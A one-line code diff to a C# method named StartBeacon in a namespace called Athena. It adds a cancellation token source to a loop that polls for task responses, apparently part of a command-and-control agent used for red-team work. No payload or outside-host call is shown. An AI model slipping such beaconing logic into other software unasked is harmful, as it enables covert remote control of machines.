@@ -77,6 +77,7 @@ namespace Athena
         public async Task StartBeacon()
         {
             Debug.WriteLine($"[{DateTime.Now}] Starting Beacon Loop.");
+            this.cts = new CancellationTokenSource();
             while (!cancellationToken.IsCancellationRequested)
             {
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
